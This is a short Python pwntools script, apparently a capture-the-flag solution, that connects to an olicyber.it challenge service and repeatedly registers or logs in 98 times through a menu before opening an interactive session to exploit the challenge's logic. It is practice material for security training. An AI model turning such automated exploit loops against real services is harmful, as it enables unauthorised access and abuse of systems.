from pwn import *

r = remote("oursql.challs.olicyber.it", 21002)

for i in range(98):
    print(i)

    r.recv(2048)
    r.sendline(b"1")
    r.sendlineafter(b"Username: ", b"username")
    r.sendlineafter(b"Password: ", b"password")
    
    r.recv(2048)
    if i != 97:
        r.sendline(b"4")

r.interactive()